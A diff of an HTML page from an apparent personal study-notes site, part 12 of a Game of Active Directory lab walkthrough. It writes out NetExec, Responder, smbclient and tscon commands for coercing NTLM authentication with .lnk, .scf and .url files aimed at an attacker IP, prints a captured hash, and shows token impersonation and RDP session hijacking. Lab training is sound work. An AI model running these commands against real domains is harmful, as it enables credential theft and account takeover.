@@ -1,233 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GOAD Part 12 - Having Fun Inside a Domain | Mr Stark Study Notes</title>
-
+  <title>GOAD - Part 12 - Having Fun | Mr Stark Study Notes</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-  
   <style>
-    /* GOAD-specific styles - Large fonts for readability */
-    .goad-content {
-      max-width: 100%;
-      margin: 0 auto;
-      padding: 30px;
-      font-size: 20px;
-    }
-    
-    .goad-content h1 {
-      color: var(--white-2);
-      font-size: 36px;
-      margin-bottom: 25px;
-    }
-    
-    .goad-content h2 {
-      color: var(--orange-yellow-crayola);
-      font-size: 30px;
-      margin: 35px 0 20px 0;
-      padding-bottom: 10px;
-      border-bottom: 1px solid var(--jet);
-    }
-    
-    .goad-content h3 {
-      color: var(--white-1);
-      font-size: 26px;
-      margin: 30px 0 15px 0;
-    }
-    
-    .goad-content h4 {
-      color: var(--white-2);
-      font-size: 24px;
-      margin: 25px 0 15px 0;
-    }
-    
-    .goad-content p {
-      color: var(--light-gray);
-      margin-bottom: 18px;
-      line-height: 1.8;
-      font-size: 20px;
-    }
-    
-    .goad-content code {
-      background: var(--onyx);
-      color: var(--orange-yellow-crayola);
-      padding: 3px 8px;
-      border-radius: 4px;
-      font-family: 'Courier New', monospace;
-      font-size: 18px;
-    }
-    
-    .goad-content pre {
-      background: var(--eerie-black-2);
-      border: 1px solid var(--jet);
-      border-radius: 8px;
-      padding: 20px;
-      overflow-x: auto;
-      margin: 20px 0;
-    }
-    
-    .goad-content pre code {
-      background: transparent;
-      color: var(--light-gray);
-      padding: 0;
-      font-size: 18px;
-    }
-    
-    .goad-content img {
-      max-width: 100%;
-      border-radius: 8px;
-      margin: 25px 0;
-      border: 1px solid var(--jet);
-    }
-    
-    .goad-content ul, .goad-content ol {
-      color: var(--light-gray);
-      margin: 20px 0;
-      padding-left: 40px;
-      font-size: 20px;
-    }
-    
-    .goad-content li {
-      margin-bottom: 10px;
-    }
-    
-    .goad-content strong {
-      color: var(--white-2);
-    }
-    
-    .goad-content blockquote {
-      border-left: 3px solid var(--orange-yellow-crayola);
-      padding-left: 20px;
-      margin: 25px 0;
-      color: var(--light-gray);
-      font-style: italic;
-      font-size: 20px;
-    }
-    
-    .goad-content table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 25px 0;
-      font-size: 18px;
-    }
-    
-    .goad-content th, .goad-content td {
-      border: 1px solid var(--jet);
-      padding: 15px;
-      text-align: left;
-    }
-    
-    .goad-content th {
-      background: var(--eerie-black-2);
-      color: var(--orange-yellow-crayola);
-    }
-    
-    .goad-content td {
-      color: var(--light-gray);
-    }
-    
-    .part-navigation {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 50px;
-      padding-top: 25px;
-      border-top: 1px solid var(--jet);
-      font-size: 20px;
-    }
-    
-    .part-navigation a {
-      color: var(--orange-yellow-crayola);
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      transition: color 0.3s;
-    }
-    
-    .part-navigation a:hover {
-      color: var(--white-2);
-    }
-    
-    .goad-sidebar-list {
-      list-style: none;
-      padding: 0;
-    }
-    
-    .goad-sidebar-list li {
-      margin-bottom: 8px;
-    }
-    
-    .goad-sidebar-list a {
-      color: var(--light-gray);
-      text-decoration: none;
-      display: block;
-      padding: 10px 15px;
-      border-radius: 8px;
-      transition: all 0.3s;
-      font-size: 16px;
-    }
-    
-    .goad-sidebar-list a:hover,
-    .goad-sidebar-list a.active {
-      background: var(--onyx);
-      color: var(--orange-yellow-crayola);
-    }
-    
-    .goad-sidebar-list a.active {
-      background: var(--orange-yellow-crayola);
-      color: var(--eerie-black-1);
-      font-weight: var(--fw-500);
-    }
-    
-    .back-link {
-      color: var(--light-gray);
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      margin-bottom: 25px;
-      font-size: 16px;
-    }
-    
-    .back-link:hover {
-      color: var(--orange-yellow-crayola);
-    }
+    .goad-content { max-width: 900px; margin: 0 auto; padding: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: var(--fs-1); margin-bottom: 20px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: var(--fs-2); margin: 30px 0 15px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: var(--fs-3); margin: 25px 0 10px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 15px; line-height: 1.8; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 15px; overflow-x: auto; margin: 15px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid var(--jet); }
+    .goad-content ul, .goad-content ol { color: var(--light-gray); margin: 15px 0; padding-left: 30px; }
+    .goad-content li { margin-bottom: 8px; }
+    .goad-content strong { color: var(--white-2); }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; display: flex; align-items: center; gap: 5px; transition: color 0.3s; }
+    .part-navigation a:hover { color: var(--white-2); }
+    .goad-sidebar-list { list-style: none; padding: 0; max-height: 60vh; overflow-y: auto; }
+    .goad-sidebar-list li { margin-bottom: 5px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; transition: all 0.3s; font-size: var(--fs-7); }
+    .goad-sidebar-list a:hover, .goad-sidebar-list a.active { background: var(--onyx); color: var(--orange-yellow-crayola); }
+    .goad-sidebar-list a.active { background: var(--orange-yellow-crayola); color: var(--eerie-black-1); font-weight: var(--fw-500); }
+    .back-link { color: var(--light-gray); text-decoration: none; display: flex; align-items: center; gap: 5px; margin-bottom: 20px; font-size: var(--fs-7); }
+    .back-link:hover { color: var(--orange-yellow-crayola); }
   </style>
 </head>
-
 <body>
-
   <main>
 
     <!-- Sidebar -->
     <aside class="sidebar" data-sidebar>
-
       <div class="sidebar-info">
-
         <figure class="avatar-box">
           <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
         </figure>
-
         <div class="info-content">
           <h1 class="name" title="Mr Stark">Mr Stark</h1>
           <p class="title">GOAD Series</p>
         </div>
-
         <button class="info_more-btn" data-sidebar-btn>
           <span>Show Parts</span>
           <ion-icon name="chevron-down"></ion-icon>
         </button>
-
       </div>
 
-            <div class="sidebar-info_more">
+      <div class="sidebar-info_more">
         <div class="separator"></div>
         
         <a href="../index.html" class="back-link">
@@ -240,19 +67,27 @@
         <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
         
         <ul class="goad-sidebar-list">
-          <li><a href="index.html">Overview</a></li>
-          <li><a href="part-1-reconnaissance.html">Part 1: Reconnaissance</a></li>
-          <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
-          <li><a href="part-3-authenticated-enumeration.html">Part 3: Auth Enum</a></li>
-          <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relay</a></li>
-          <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
-          <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
-          <li><a href="part-7-privilege-escalation.html">Part 7: PrivEsc</a></li>
-          <li><a href="part-8-lateral-move.html">Part 8: Lateral Move</a></li>
-          <li><a href="part-9-delegations.html">Part 9: Delegations</a></li>
-          <li><a href="part-10-acl.html">Part 10: ACL</a></li>
-          <li><a href="part-11-trusts.html">Part 11: Trusts</a></li>
+          <li><a href="index.html" class="">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html" class="">Part 1: Reconnaissance & Scan</a></li>
+          <li><a href="part-2-finding-users.html" class="">Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html" class="">Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html" class="">Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html" class="">Part 5: ADCS</a></li>
+          <li><a href="part-6-mssql.html" class="">Part 6: MSSQL</a></li>
+          <li><a href="part-7-privilege-escalation.html" class="">Part 7: PrivEsc</a></li>
+          <li><a href="part-8-lateral-move.html" class="">Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html" class="">Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html" class="">Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html" class="">Part 11: Trusts</a></li>
           <li><a href="part-12-having-fun.html" class="active">Part 12: Having Fun</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Other Labs:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="../ninja-hacker-academy/">Ninja Hacker Academy</a></li>
         </ul>
 
         <div class="separator"></div>
@@ -268,181 +103,345 @@
     </aside>
 
     <div class="main-content">
-
-<article class="about active" data-page="about">
-
-        <header class="h2 article-title">Having Fun Inside a Domain</header>
-
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Part 12: Having Fun</header>
         <section class="goad-content">
+<strong>GOAD - part 12 - Having fun inside a domain - Done</strong>
 
+<p>
+    The different techniques presented here need an active user to exploit them. For this attack, we need to have a valid user in the domain.
+    We will have to simulate the victim by RDP connection manually.
+</p>
 
-<p>The different techniques presented here need an active user to exploit them. For this attack, we need to have a valid user in the domain.</p>
-<p>We will have to simulate the victim by RDP connection manually.</p>
+<p>
+    # <strong>Coerce me with files</strong>
+</p>
 
-<h2>Coerce me with files</h2>
+<p>
+    let’s start by enumerating CastelBlack server shares.
+</p>
 
-<p>let’s start by enumerating CastelBlack server shares.</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_1.png" alt="">
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares</code>
 
+    <img src="images/image-258.png" alt="Untitled">
 
-<p>We can see above that we have Read and Write access in all share.</p>
-<p>So we can try some attacks here. Let’s start with slinky : .lnk file</p>
+<p>
+    We can see above that we have <strong><code>Read</code></strong> and <strong><code>Write</code></strong> access in <strong><code>all</code></strong> share.
+</p>
 
+<p>
+    So we can try some attacks here. Let’s start with <strong><code>slinky : .lnk file</code></strong>
+</p>
 
-<h3>Slinky: .lnk file</h3>
+<p>
+    ## <strong>Slinky: .lnk file</strong>
+</p>
 
-<p>For this kind of attack, we will create a file with NetExec with module slinky. This module will create an ink file in every folders we do have Write permission on our target server.</p>
+<p>
+    For this kind of attack, we will create a file with NetExec with module <strong>slinky.</strong> This module will create an ink file in every folders we do have <strong><code>Write</code></strong> permission on our target server.
+</p>
 
-<p>1st - Let’s create and drop the file in a single command.</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_2.png" alt="">
+<p>
+    1st - Let’s create and drop the file in a single command.
+</p>
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares</code>
 
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip</code>
 
-<p>Above we can see that we enumerated the shares first then we created the .lnk file and added to all writable shares, in our case this file was added to all share.</p>
-<p>After this, our next step is to launch Responder and listen on the network, in our case, we will use the interface on the network we are targeting.</p>
-<p>sudo responder -I vmnet2</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_3.png" alt="">
+    <img src="images/image-261.png" alt="Untitled">
 
+<p>
+    Above we can see that we enumerated the shares first then we created the <strong><code>.lnk</code></strong> file and added to all writable shares, in our case this file was added to <strong><code>all</code></strong> share.
+</p>
 
-<p>For this attack to work in this lab, we will login with a user, because we don’t have a valid bot.</p>
-<p>Let’s use xfreerdp ro remote access to the machine.</p>
-<p>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore /size:80%</p>
+<p>
+    After this, our next step is to launch Responder and listen on the network, in our case, we will use the interface on the network we are targeting.
+</p>
 
-<p>After connecting, we need to go to the shares all.</p>
-<p>\\castelblack.north.sevenkingdoms.local\\all</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_4.png" alt="">
+    <code>sudo responder -I vmnet2</code>
 
+    <img src="images/image-262.png" alt="Untitled">
 
+<p>
+    For this attack to work in this lab, we will login with a user, because we don’t have a valid bot.
+    Let’s use xfreerdp ro remote access to the machine.
+</p>
 
-<p>Once the user access the share we get the users hash through Responder.</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_5.png" alt="">
+    <code>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore /size:80%</code>
 
+<p>
+    After connecting, we need to go to the shares <strong><code>all</code></strong>.
+</p>
 
-<pre><code>catelyn.stark::NORTH:19d99c632a805889:0A6C8691396FE9B6A3AD3B5B3B378671:0101000000000000807C08D0D26CDA0113EF01224A1B3CFE000000000200080036005A005300590001001E00570049004E002D004200560032003900370035003100460036005700510004003400570049004E002D00420056003200390037003500310046003600570051002E0036005A00530059002E004C004F00430041004C000300140036005A00530059002E004C004F00430041004C000500140036005A00530059002E004C004F00430041004C0007000800807C08D0D26CDA010600040002000000080030003000000000000000010000000020000014D15C2C005F5BBD167168BE6315E609F4B52B5F2604A44EB5ECB51FFF2D5E5E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000</code></pre>
+    <strong><code>\\castelblack.north.sevenkingdoms.local\\all</code></strong>
 
+    <img src="images/image-263.png" alt="Untitled">
 
-<p>We can now get the NTLMv2 hash and try to crack it using John or hashcat.</p>
-<p>In case we can not crack the hash(for password complexity) It is also possible to do a relay here using ntlmrelayx.py to not smb signed server and get share access or admin access depending on the relayed authentication target.</p>
+<p>
+    Once the user access the share we get the users hash through Responder.
+</p>
 
-<p>To keep the lab clean, let’s clean this .lnk file.</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true</p>
+    <img src="images/image-264.png" alt="Untitled">
 
-<h2>.scf : sucffy</h2>
+    <pre><code class="language-jsx">    catelyn.stark::NORTH:19d99c632a805889:0A6C8691396FE9B6A3AD3B5B3B378671:0101000000000000807C08D0D26CDA0113EF01224A1B3CFE000000000200080036005A005300590001001E00570049004E002D004200560032003900370035003100460036005700510004003400570049004E002D00420056003200390037003500310046003600570051002E0036005A00530059002E004C004F00430041004C000300140036005A00530059002E004C004F00430041004C000500140036005A00530059002E004C004F00430041004C0007000800807C08D0D26CDA010600040002000000080030003000000000000000010000000020000014D15C2C005F5BBD167168BE6315E609F4B52B5F2604A44EB5ECB51FFF2D5E5E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000
+    </code></pre>
 
-<p>The previous attack can also be achieved using .scf. The proccess is exactly the same as the previous one.</p>
+<p>
+    > This coerce append automatically when the victim visit the share, no need to click! I let you imagine what append if you drop that kind of file on a common public share during your pentest.
+    Here the file start with a “.” so it will be hidden if you don’t activate show hidden file option. The coerce only append when the file is showed (in a pentest it’s recommended to not use a filename starting with “.”)
+    > 
+</p>
 
-<h2>.url file</h2>
+<p>
+    We can now get the NTLMv2 hash and try to crack it using John or hashcat.
+</p>
 
-<p>Now, this Coerce attack is by using .url files. Let’s start by creating a file called salaryFiles.url , it’s good to use creative names, even tho for this attack to work, the users doesn’t need to click/open the file, the user just need to access the folder were the file is.</p>
+<p>
+    In case we can not crack the hash(for password complexity) It is also possible to do a relay here using <a href="http://ntlmrelayx.py">ntlmrelayx.py</a> to not smb signed server and get share access or admin access depending on the relayed authentication target.
+</p>
 
-<pre><code>[InternetShortcut]
-URL=http://hr.company.com/pwned
-WorkingDirectory=test
-IconFile=\\10.4.10.1\%USERNAME%.icon
-IconIndex=1</code></pre>
+<p>
+    To keep the lab clean, let’s clean this .lnk file.
+</p>
 
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true</code>
 
+<p>
+    # <strong>.scf : sucffy</strong>
+</p>
 
-<p>The next step it to upload this file to the share we do have Write permission, in our case it the share all. we can use smblient.py to upload the file.</p>
-<p>smbclient.py north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_6.png" alt="">
+<p>
+    The previous attack can also be achieved using .scf. The proccess is exactly the same as the previous one.
+</p>
 
+<p>
+    # <strong>.url file</strong>
+</p>
 
+<p>
+    Now, this Coerce attack is by using .url files. Let’s start by creating a file called <strong><code>salaryFiles.url</code></strong> , it’s good to use creative names, even tho for this attack to work, the users doesn’t need to click/open the file, the user just need to access the folder were the file is.
+</p>
 
-<p>After this, our next step is to launch Responder and listen on the network, in our case, we will use the interface on the network we are targeting.</p>
-<p>sudo responder -I vmnet2</p>
+    <pre><code class="language-jsx">    [InternetShortcut]
+<p>
+    URL=http://hr.company.com/pwned
+    WorkingDirectory=test
+    IconFile=\\10.4.10.1\%USERNAME%.icon
+    IconIndex=1
+</p>
+    </code></pre>
 
-<p>After uploading the file into the share all, we will access remotely to simulate a valid user.</p>
-<p>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore /size:80%</p>
-<p>access the share below</p>
-<p>\\castelblack.north.sevenkingdoms.local\\all</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_7.png" alt="">
+<p>
+    The next step it to upload this file to the share we do have Write permission, in our case it the share <strong><code>all</code></strong>. we can use smblient.py to upload the file.
+</p>
 
+    <a href="http://smbclient.py/"><code>smbclient.py</a> north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local</code>
 
+    <img src="images/image-265.png" alt="Untitled">
 
-<p>After the user access the share, we will get the user hash through Responder.</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_8.png" alt="">
+<p>
+    After this, our next step is to launch Responder and listen on the network, in our case, we will use the interface on the network we are targeting.
+</p>
 
+    <code>sudo responder -I vmnet2</code>
 
+<p>
+    After uploading the file into the share all, we will access remotely to simulate a valid user.
+</p>
 
+    <code>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore /size:80%</code>
 
-<h2>Webdav coerce - I need to get later back to finish it </h2>
+<p>
+    access the share below
+</p>
 
-<p>For this attack to work, webdav needs to be enabled on the host.</p>
+    <strong><code>\\castelblack.north.sevenkingdoms.local\\all</code></strong>
 
+    <img src="images/image-266.png" alt="Untitled">
 
-<p>Let’s start by enumerating webdav using NetExec.</p>
-<p>netexec smb 10.4.10.10-23 -u arya.stark -p 'Needle' -d 'north.sevenkingdoms.local' -M webdav</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_9.png" alt="">
+<p>
+    After the user access the share, we will get the user hash through Responder.
+</p>
 
+    <img src="images/image-267.png" alt="Untitled">
 
-<p>As we can see above, webdav is not enabled on none of the servers in the network.</p>
-<p>For the labbing purpose, we can enable webdav by remote accessing the host. Webdav is installed on essos.local Domain Controller (braavos.essos.local) but it’s not enabled</p>
+<p>
+    # <strong>Webdav coerce - I need to get later back to finish it</strong>
+</p>
 
-<p>We can see that webdav is installed, but not enable it.</p>
-<p>xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:braavos.essos.local /cert-ignore</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_10.png" alt="">
+<p>
+    For this attack to work, <strong>webdav</strong> needs to be enabled on the host.
+</p>
 
+<p>
+    > Webclient is installed by default on windows workstations but in a stopped status. 
+    Webclient is not installed by default on windows server, <strong>it has been added on goad build as a custom vulnerability</strong>.
+    > 
+</p>
 
+<p>
+    Let’s start by enumerating webdav using NetExec.
+</p>
+    <code>netexec smb 10.4.10.10-23 -u arya.stark -p 'Needle' -d 'north.sevenkingdoms.local' -M webdav</code>
 
+    <img src="images/image-268.png" alt="Untitled">
 
-<p>Now let’s continue… We can use Netexec for the next step or we can also create our file and upload it using smbclient.py. For this, i’ll use NetExec.</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d 'north.sevenkingdoms.local' -M drop-sc</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_11.png" alt="">
+<p>
+    As we can see above, webdav is not enabled on none of the servers in the network.
+</p>
 
+<p>
+    For the labbing purpose, we can enable webdav by remote accessing the host. Webdav is installed on essos.local Domain Controller (<strong>braavos.essos.local</strong>) but it’s not enabled
+</p>
 
-<p>Above it’s possible to see that, NetExec enumerated the shares we do have Write access, created the malicious file and uploaded it to the share we do have Write permission, which is the all .</p>
+<p>
+    We can see that webdav is installed, but not enable it.
+</p>
 
-<p>Once the attacker access the share we were able to upload the malicious file, it will automatically enable WebDav.</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_12.png" alt="">
+    <code>xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:braavos.essos.local /cert-ignore</code>
 
+    <img src="images/image-269.png" alt="Untitled">
 
+<p>
+    Now let’s continue… We can use Netexec for the next step or we can also create our file and upload it using smbclient.py. For this, i’ll use NetExec.
+</p>
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d 'north.sevenkingdoms.local' -M drop-sc</code>
 
-<p>If we enumerate the Webdav service again on the network, we will notice that webdav is enabled now on our network on host 10.4.10.23. </p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_13.png" alt="">
+    <img src="images/image-270.png" alt="Untitled">
 
+<p>
+    Above it’s possible to see that, NetExec enumerated the shares we do have <strong><code>Write</code></strong> access, created the malicious file and uploaded it to the share we do have Write permission, which is the <strong><code>all</code> .</strong>
+</p>
 
+<p>
+    Once the attacker access the share we were able to upload the malicious file, it will automatically enable WebDav.
+</p>
 
-<p>Once we see the webclient started we can add a DNS entry to our responder ip with dnstools</p>
+    <img src="images/image-272.png" alt="Untitled">
 
+<p>
+    > Just to be clear here we are connected as khal drogo on braavos. The malicious document is on castelblack. When khal visit the share all on castelblack containing our malicious document, the webclient service start on braavos (khal’s client machine)
+    > 
+</p>
 
+<p>
+    If we enumerate the Webdav service again on the network, we will notice that webdav is enabled now on our network on host 10.4.10.23. 
+</p>
 
-<h2>Impersonate Users</h2>
+    <img src="images/image-273.png" alt="Untitled">
 
-<p>Another cool way to take other accounts is using token impersonation.</p>
-<p>Let’s use NetExec for this attack, we need to to have a valid user in the domain.</p>
-<p>netexec smb castelblack.north.sevenkingdoms.local -u 'jeor.mormont' -p 'L0ngCl@w' -d north.sevenkingdoms.local -M impersonate</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_14.png" alt="">
+<p>
+    Once we see the webclient started we can add a DNS entry to our responder ip with <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstools</a>
+</p>
 
+<p>
+    # <strong>Impersonate Users</strong>
+</p>
 
-<p>As we can see above, we were able to launch this attack, and now we have a token ID of each of the users.</p>
-<p>Now we just need to execute commands as a user, using the user token ID.</p>
+<p>
+    Another cool way to take other accounts is using token impersonation.
+    Let’s use NetExec for this attack, we need to to have a valid user in the domain.
+</p>
 
-<p>netexec smb castelblack.north.sevenkingdoms.local -u 'jeor.mormont' -p 'L0ngCl@w' -d north.sevenkingdoms.local -M impersonate -o TOKEN=6 EXEC=whoami</p>
-<img src="./game-of-active-directory/part-12-having-fun/images/screenshot_15.png" alt="">
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u 'jeor.mormont' -p '*L0ngCl@w*' -d north.sevenkingdoms.local -M impersonate</code>
 
+    <img src="images/image-274.png" alt="Untitled">
 
-<p>We can see see above that we can execute any command impersonting any kind of user by choosing the Token ID.</p>
+<p>
+    As we can see above, we were able to launch this attack, and now we have a token ID of each of the users.
+    Now we just need to execute commands as a user, using the user token ID.
+</p>
 
-<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
-  <a href="part-11-trusts.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 11</a>
-  <a href="index.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 13 →</a>
-</div>
+    <code>netexec smb castelblack.north.sevenkingdoms.local -u 'jeor.mormont' -p '*L0ngCl@w*' -d north.sevenkingdoms.local -M impersonate -o TOKEN=6 EXEC=whoami</code>
 
-        </section>
+    <img src="images/image-275.png" alt="Untitled">
 
-      </article>
+<p>
+    We can see see above that we can execute any command impersonting any kind of user by choosing the Token ID.
+</p>
 
+<p>
+    # <strong>RDP Session Hijacking</strong>
+</p>
+
+<p>
+    Adversaries may hijack a legitimate user's remote desktop session to move laterally within environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).
+</p>
+
+<p>
+    Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console. C:\Windows\System32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected session. It can also lead Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.
+</p>
+
+<p>
+    It is possible to switch from one user's desktop to another through the use of <strong>tscon</strong>, this will require us to have NT AUTHORITY/SYSTEM
+</p>
+
+<p>
+    This doesn’t work on windows server 2019,  but it works perfect on windows 2016.
+</p>
+
+<p>
+    Let’s use 2 users here. 
+</p>
+
+<p>
+    Let’s start by connecting as the victim. This is just for labbing purpose, because in a real environment we will have users logged in.
+</p>
+
+<p>
+    daenerys.targaryen will play the roll as our victim user.
+</p>
+
+    <code>xfreerdp /d:essos.local /u:daenerys.targaryen /p:'BurnThemAll!' /v:10.4.10.23 /cert-ignore</code>
+
+<p>
+    Now let’s connect as the attacker on the same machine.
+    We will use khal.drogo as the attacker(it’s the user we own)
+</p>
+
+    <code>xfreerdp /d:essos.local /u:khal.drogo /p:'horse' /v:10.4.10.23 /cert-ignore</code>
+
+<p>
+    It’s better to run CMD.exe as an administrator.
+</p>
+
+<p>
+    We can then enumerate users session by issuing the command:
+</p>
+
+    <code>query user</code>
+
+    <img src="images/image-276.png" alt="Untitled">
+
+<p>
+    As we can see above we can do have 2 users logged in with RDP session. The first user is the user we own, and we can distiguise this we the GREATER THAN sign that we do have on the user own.
+    then we can see that we do have the second user(daenerys.targaryen) andd we can see that the user has RDP-TCP session as well with th ID 3.
+</p>
+
+<p>
+    We can Hijack the user daenerys.targaryen RDP session.
+</p>
+
+    <code>tscon.exe 3 /dest:rdp-tcp#5</code>
+
+<p>
+    When we launch the command our khal’s rdp session is replaced by daenerys session and the other windows we open before with daenerys will close.
+</p>
+
+
+<h3>Future Attack to be added:</h3>
+
+<strong>Login Script Hijacking: A</strong> classic persistence move where we use our <strong>GenericAll</strong> rights to booby-trap User’s scriptPath attribute, forcing the network to run our malicious code the absolute second he/she logs into her computer.
+<div class="part-navigation">
+      <a href="part-11-trusts.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Trusts</a>
+      <span></span>
     </div>
-
+        </section>
+      </article>
+    </div>
   </main>
-
   <script src="../assets/js/script.js"></script>
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-
 </body>
-
 </html>
